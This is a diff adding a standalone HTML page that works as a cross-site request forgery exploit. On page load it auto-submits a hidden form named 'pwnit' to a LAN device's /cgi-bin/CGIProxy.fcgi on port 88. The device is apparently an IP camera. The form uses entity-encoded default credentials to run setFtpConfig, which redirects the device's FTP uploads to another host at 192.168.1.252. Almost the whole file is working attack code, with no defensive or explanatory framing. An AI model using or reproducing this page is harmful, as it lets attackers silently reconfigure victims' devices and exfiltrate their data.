@@ -1,0 +1,33 @@
+<html>
+<body>
+<form id="pwnit" action="willbereplaced/cgi-bin/CGIProxy.fcgi">
+
+        <input type="hidden" name="usr&#61;user&amp;pwd&#61;password&amp;cmd&#61;setFtpConfig&amp;ftpAddr&#61;ftp&#58;&#47;&#47;192&#46;168&#46;1&#46;252&#47;&amp;ftpPort&#61;21&amp;mode&#61;0&amp;userName&#61;ftp&amp;password&#61;password&amp;1466017335897" value="" />
+        <input type="submit" value="Submit request" />
+
+</form>
+
+<script>
+function gup( name, url ) {
+  if (!url) url = location.href;
+  name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+  var regexS = "[\\?&]"+name+"=([^&#]*)";
+  var regex = new RegExp( regexS );
+  var results = regex.exec( url );
+  return results == null ? null : results[1];
+}
+
+var lastOctet = gup('octet', window.location.href );
+var network = gup('network', window.location.href );
+
+var iform;
+
+iform=document.getElementById("pwnit");
+
+iform.action = "http://"+network+"."+lastOctet.toString()+":88/cgi-bin/CGIProxy.fcgi";
+
+iform.submit();
+</script>
+
+</body>
+</html>
